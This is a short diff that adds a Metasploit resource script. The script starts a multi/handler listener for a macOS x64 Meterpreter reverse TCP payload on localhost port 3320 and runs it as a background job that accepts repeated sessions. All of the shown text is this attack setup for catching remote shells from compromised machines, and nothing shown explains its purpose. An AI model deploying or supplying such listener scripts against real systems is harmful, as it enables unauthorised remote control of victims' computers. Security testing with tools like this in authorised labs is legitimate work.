@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD osx/x64/meterpreter/reverse_tcp
+set LPORT 3320
+set LHOST 127.0.0.1
+set ExitOnSession false
+exploit -j
